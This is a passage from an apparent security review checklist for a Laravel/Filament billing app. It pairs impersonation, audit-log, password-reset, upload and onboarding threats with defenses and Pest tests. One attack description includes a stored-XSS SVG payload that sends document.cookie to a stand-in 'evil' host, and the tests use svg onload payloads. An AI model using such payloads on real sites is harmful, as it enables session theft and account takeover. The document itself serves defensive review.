  - **Defense:** In UserPolicy::impersonate return false when `$target->role === Role::Superadmin` OR `$target->id === $actor->id` OR `$target->status !== Status::Active` (no impersonating suspended accounts). Enforce identically inside start() with an explicit abort_if($target->isSuperadmin() || $target->is($actor), 403). Keep the target-role check server-side, never rely on hiding the row.
  - **Test:** it('cannot impersonate a superadmin or self'): actingAs(superadmin); expect(fn()=>start($otherSuperadmin))->toThrow(AuthorizationException); expect(fn()=>start($superadmin))->toThrow(AuthorizationException); assert no audit_logs 'impersonation.start' row was written and session has no impersonator_id.
- [ ] **[HIGH]** Nested impersonation overwrites the original impersonator identity
  - **Attack:** A session already has impersonator_id=<superadminA> (currently impersonating owner X). start() is called again (e.g., admin navigates back to /admin via a still-valid tab, or a crafted Livewire replay) with a new target Y. If start() unconditionally writes session('impersonator_id', auth()->id()), the current auth id is now owner X (or a second admin), so impersonator_id is overwritten with the wrong value. Stop then restores to X instead of superadminA, stranding a session logged in as X with elevated intent and breaking the audit chain (the A→X hop is lost).
  - **Defense:** start() must abort_if(session()->has('impersonator_id'), 409/403, 'already impersonating') — impersonation is strictly single-level. Store the ORIGINAL impersonator only once. Optionally store an immutable impersonation_started_at + impersonator_id pair and refuse any nested start until stop() clears it.
  - **Test:** it('refuses nested impersonation'): start($ownerX) as superadmin; then within impersonated session expect(fn()=>start($ownerY))->toThrow(); assert session('impersonator_id') still equals the original superadmin id and only one 'impersonation.start' audit row exists.
- [ ] **[HIGH]** Stop-impersonation logs in as an unverified/attacker-chosen impersonator id
  - **Attack:** stop() reads session('impersonator_id') and calls Auth::loginUsingId($id) to 'return' to the superadmin. If that id is trusted blindly, any path that lets a value land in that session key (a mis-scoped setter, a nested-start bug per above, or a future code path that copies request input into session) means 'Stop' becomes a login-as-anyone primitive: set impersonator_id to a superadmin's id, hit stop, get elevated. Even without tampering, if a superadmin is later demoted/suspended while impersonating, stop() re-grants them a superadmin session.
  - **Defense:** Keep stop()'s re-verification: load session('impersonator_id') as a User and confirm it still exists and is role===Superadmin && status===Active BEFORE Auth::loginUsingId; otherwise Auth::logout(), forget the key, redirect to login. Call session()->regenerate() after the restore login (fixation). Justify it by the real cases — impersonator demoted/suspended mid-session, or a stale/overwritten key from a nested-start bug — not by client-tamperable session values, which Laravel's signed server-side sessions already prevent.
  - **Test:** it('stop refuses a non-superadmin impersonator id'): manually put session impersonator_id=$owner->id, call stop(), assert user is logged OUT (guest) not logged in as owner, and impersonator_id cleared. Second test: valid flow start→stop restores exactly the original superadmin and session id changed.
- [ ] **[HIGH]** audit_logs are mutable/readable — a compromised admin or misconfigured policy can tamper or leak
  - **Attack:** audit_logs is surfaced as a superadmin Filament resource. If it ships with default Edit/Delete actions and a $fillable/guarded that allows mass-assign, a superadmin (or an attacker who reaches /admin) can rewrite or delete the very records of impersonation, superadmin writes and accountant answers that are supposed to be tamper-evidence. If canViewAny/canAccessPanel is loose, an accountant could also read cross-tenant audit data (IPs, subjects).
  - **Defense:** Make the model append-only: no Edit/Delete actions on the resource (canEdit/canDelete/canDeleteAny => false in policy), block writes at the model with a booted() observer that throws on 'updating' and 'deleting' events, and set actor/ip/subject server-side only (never from request input; no user-supplied $fillable for actor_id). Restrict canViewAny to role===superadmin. Consider a DB grant that revokes UPDATE/DELETE on the table for the app role.
  - **Test:** Pest: $log->update([...]) or $log->delete() throws / returns false (assert row unchanged in DB). livewire(ListAuditLogs) as accountant → assertForbidden. Assert the resource exposes no DeleteAction (assertActionDoesNotExist).
- [ ] **[MEDIUM]** Impersonation not cleared on logout / stop leaves elevated session
  - **Attack:** Superadmin impersonates Anna, then clicks Filament's normal Logout instead of 'Stop impersonating'. If logout only calls Auth::logout() and forgets to clear session('impersonator_id'), the key survives into the login screen; the next person to authenticate on that browser (or a re-login) can hit the stop-impersonation route and be handed the superadmin identity referenced by the stale key. Also: on 'stop', if the session isn't regenerated, the impersonated Anna's CSRF/session artifacts persist under the restored superadmin.
  - **Defense:** Filament v5's default logout already calls $request->session()->invalidate() + regenerateToken(), which flushes ALL session data including impersonator_id — so the 'key survives into the login screen' leak only exists if someone replaces logout with a bare Auth::logout() that skips invalidate(). So the primary rule is: keep Filament's default logout, or if you override the LogoutResponse, still call session()->invalidate(). The genuinely-needed hardening is on STOP, not logout: on both impersonation start and stop call session()->regenerate() to rotate the session id (block fixation/artifact carryover), restore via Auth::loginUsingId(), audit-log the stop ('impersonation.stop'), and make the stop route INDEPENDENTLY re-verify that session('impersonator_id') resolves to an active superadmin before restoring — never blindly Auth::loginUsingId(session key). That last check is what neutralizes any stale-key escalation.
  - **Test:** it('clears impersonation state on logout and regenerates session on stop'): start impersonation, capture session id; post logout; assert !session()->has('impersonator_id'). Separate: stop impersonation asserts new session id !== impersonating session id and Auth::id()===superadmin->id and an audit row for 'impersonation.stop'.
- [ ] **[MEDIUM]** Only start is audited — stop/return leaves an unbounded, unlogged window
  - **Attack:** If audit_logs records 'impersonation.start' but not the stop, forensic review cannot bound the impersonation window: an admin can impersonate at 09:00, act all day, and there is no 'impersonation.stop' timestamp, so any attribution ambiguity (which actions were the operator's vs the owner's after return) is unresolvable. Worse, if start logging happens AFTER Auth::login($target) and the log write itself uses auth()->id(), the start row is attributed to the owner too, erasing who initiated it.
  - **Defense:** Write the 'impersonation.start' audit row BEFORE Auth::login($target) so actor_id resolves to the real superadmin (capture subject_id=target, request IP, user-agent, timestamp). Write 'impersonation.stop' in stop() BEFORE restoring the superadmin, recording duration. Link the pair with a shared session_uuid (or an impersonation_ended_at update) for clean forensic bounding. Note the design already commits to logging both ends, so this is an ordering/actor-capture refinement, not a new audit surface.
  - **Test:** it('logs both start and stop with correct actor'): start($owner) as superadmin then stop(); assert_database_has('audit_logs', ['action'=>'impersonation.start','actor_id'=>$superadmin->id,'subject_id'=>$owner->id]) and the same for 'impersonation.stop'; assert both rows have non-null ip and the start row's actor is the superadmin (not the owner).

### Phase 9 — Onboarding, hardening, polish  (7)

- [ ] **[HIGH]** Custom resetToken column instead of Laravel broker → plaintext, non-expiring, guessable reset
  - **Attack:** The Prisma schema carries resetToken + resetTokenExpiry ON the users table. If the team ports that literally, the reset token is (a) likely stored in plaintext (DB read = full account takeover), (b) generated with a weak RNG, and (c) reset links may lack real expiry/single-use enforcement, so a leaked or logged link is replayable indefinitely to seize any account across all three panels.
  - **Defense:** Do NOT add resetToken columns; use Laravel's Password broker + password_reset_tokens (Hash-stored token, config auth.passwords.users.expire=60, throttle=60, single-use — broker deletes the row on success). Wire Filament's ->passwordReset() to the broker. On successful reset call $user->save() with new hash so remember_token/existing sessions invalidate (rehash logs out other devices).
  - **Test:** it('reset token is single-use and expires'): $token=Password::createToken($u); travel(61)->minutes(); post reset ->assertSessionHasErrors (expired). Fresh token: reset succeeds once; replaying the same token ->assertSessionHasErrors('email'). Assert password_reset_tokens stores a hash, not the raw token.
- [ ] **[HIGH]** SVG logo/avatar upload → stored XSS served from settlo.ch origin
  - **Attack:** Onboarding/business-profile logo upload (and avatar) accepts images. If it accepts `image/svg+xml` (or only checks extension), an owner uploads a .svg containing `<svg onload=...>` / `<script>`. When served from the public disk (or shown 44×44 in the form, dashboard, or firm client book) with Content-Type image/svg+xml, the browser executes the script in the settlo.ch origin → session theft, and the accountant/superadmin who views that client's logo is also hit (cross-tenant).
  - **Defense:** Restrict `->acceptedFileTypes(['image/png','image/jpeg'])` AND validate the real MIME/content server-side (`->rules(['image','mimes:png,jpg,jpeg'])`, reject SVG). Store on a private disk and serve through a controller that sets `Content-Type` from a server-derived value + `Content-Disposition` and `X-Content-Type-Options: nosniff`; never let user-supplied SVG reach a browser as svg+xml. Prefer re-encoding via Intervention to strip any embedded markup.
  - **Test:** Livewire test on the profile/onboarding form: attach a crafted `logo.svg` (and a PNG renamed to .svg) via `->fillForm()->call('save')` and `assertHasFormErrors(['logo'])`; assert no svg is written to storage. Feature test on the logo-serving route asserts `X-Content-Type-Options: nosniff` header present.
- [ ] **[HIGH]** SVG/HTML business logo → stored XSS on invoices and firm/admin views
  - **Attack:** Logo is explicitly public and rendered as an <img> in the invoice form (44x44 preview), the invoice PDF, and the firm/admin panels viewing the client. An owner uploads logo.svg containing <script>fetch('//evil/'+document.cookie)</script> (or a .html renamed .svg). Because the file is served from storage on the app origin with Content-Type image/svg+xml and inline disposition, opening the logo URL — or any place it is embedded that allows script — executes attacker JS in an accountant's or superadmin's authenticated session (session-auth cookies), enabling account takeover / cross-tenant pivot.
  - **Defense:** Restrict logos to raster only: FileUpload::make('logoUrl')->image()->acceptedFileTypes(['image/png','image/jpeg']) PLUS server rule ->rules(['mimes:png,jpg,jpeg','max:10240']) (mimes checks real content, not extension). Explicitly reject SVG. Re-encode every accepted logo through Intervention Image (->saveManipulations or a queued job) to a fresh PNG/JPEG, discarding original bytes. Serve the public disk from a cookieless/separate path and set X-Content-Type-Options: nosniff and Content-Disposition: attachment on any raw file route so it can never render as script inline.
  - **Test:** it('rejects an svg logo', function () { actingAs($owner); livewire(BusinessProfileForm::class)->set('logoUrl', UploadedFile::fake()->createWithContent('logo.svg','<svg onload=alert(1)></svg>'))->call('save')->assertHasFormErrors(['logoUrl']); }); it('re-encodes an uploaded png stripping embedded payload', function () { Storage::fake('public'); actingAs($owner); livewire(BusinessProfileForm::class)->set('logoUrl', UploadedFile::fake()->image('logo.png',300,300))->call('save'); $bytes = Storage::disk('public')->get(BusinessEntity::first()->logoUrl); expect($bytes)->not->toContain('<script'); });
- [ ] **[MEDIUM]** APP_DEBUG leaks stack traces in prod and panels lack anti-framing/CSP headers
  - **Attack:** If APP_DEBUG=true reaches production, any triggered exception renders the Ignition page exposing env vars (DB creds, ANTHROPIC_API_KEY), file paths and query snippets. Independently, with no X-Frame-Options/CSP, an attacker iframes /app or /admin on a lookalike site to clickjack the impersonation 'Stop' banner or a mark-paid action, and MIME-sniffing lets an uploaded receipt be interpreted as HTML.
  - **Defense:** Enforce APP_DEBUG=false + APP_ENV=production (assert in a deploy check); register a custom Inertia v3 exception page (httpException handler) so prod returns a generic page. Add a SecurityHeaders middleware to the web group: X-Frame-Options: DENY, X-Content-Type-Options: nosniff, Referrer-Policy: same-origin, a Content-Security-Policy, and Strict-Transport-Security. Ensure error responses never include the exception trace.
  - **Test:** Pest: with config(['app.debug'=>false]) force an exception on a route, assert response body contains no 'Stack trace' / no env var. Second: get('/app'), assert header X-Frame-Options === 'DENY' and X-Content-Type-Options === 'nosniff'.
- [ ] **[MEDIUM]** Re-triggering a fresh trial after expiry / extending trial_ends_at from the client
  - **Attack:** Two paths. (a) trial_ends_at is settable through the onboarding/settings form payload, so the attacker submits trial_ends_at=2099-01-01 (or quota_reset_at) to extend the free trial forever. (b) After the 14-day trial expires, the attacker re-runs onboarding / hits a 'start trial' action, and if trial_used is not checked server-side a brand-new TRIALING subscription with full Pro features is minted repeatedly. Soft-deleting and re-registering the same email is a variant if uniqueness ignores soft-deleted rows.
  - **Defense:** trial_ends_at / trial_starts_at / trial_used are $guarded (see mass-assignment fix) and set only by the server when the subscription is first created (trial_ends_at = now()->addDays(plan.trial_days)). Starting a trial checks trial_used===false first and sets it true; re-onboarding never mints a second trial. Registration uniqueness on users.email must consider soft-deleted rows (unique index without ignoring deleted_at, or Rule::unique()->withoutTrashed() intentionally + block re-registration of trashed emails). Ignore any client-provided trial dates.
  - **Test:** it('ignores client trial_ends_at'): register/onboard owner posting trial_ends_at=2099-01-01; assert stored trial_ends_at ≈ now()+14d. it('refuses second trial'): owner whose trial_used=true calls startTrial ->assertForbidden(); assertDatabaseHas('subscriptions',['status'=>'expired']).
- [ ] **[MEDIUM]** Registration and password reset disclose which emails exist
  - **Attack:** Filament's default registration uses `unique:users,email` → submitting an existing email returns 'The email has already been taken', letting an attacker enumerate the platform's client base (a privacy problem for a Swiss financial tool). The forgot-password form similarly returns 'we can't find a user with that email' vs 'link sent', giving a boolean oracle to harvest valid accounts before a spray.
  - **Defense:** For password reset always return the same generic 'If that email exists, a link has been sent' regardless of broker result (Password::INVALID_USER treated like success in the UI). For registration, either require email verification so existence isn't confirmable pre-verify, or rate-limit + generic messaging; pair with the login/reset throttle so enumeration can't be automated at volume.
  - **Test:** it('reset response is identical for known and unknown emails'): post forgot-password for existing user and for random@nobody.ch; assert identical status + identical session flash/notification text. Assert no Notification/mail leaks user existence in the unknown-email case beyond the generic message.
- [ ] **[MEDIUM]** Self-setting email_verified_at / onboardingCompletedAt to bypass verification and gating
  - **Attack:** During the onboarding wizard (a Livewire flow) or a profile update, the attacker injects `email_verified_at: now` and `onboarding_completed_at: now` into the submitted state. If those columns are fillable, the user self-verifies email and marks onboarding complete without the signed verification link or completing required steps. Any panel-access / trial gate that keys on `email_verified_at` (MustVerifyEmail, canAccessPanel) is then bypassed.
  - **Defense:** Exclude `email_verified_at` and `onboarding_completed_at` from `$fillable`. Email verification happens only through Laravel's signed verification route / Filament EmailVerification — never a form field. Set `onboarding_completed_at` solely in the wizard's final server action after all steps pass validation. canAccessPanel and gating read these server-truth timestamps.
  - **Test:** Pest: livewire(OnboardingWizard)->fillForm(step data + ['email_verified_at'=>now(),'onboarding_completed_at'=>now()])->call(...); assert $user->fresh()->email_verified_at is null. Separate test: hitting the signed verify route sets it.
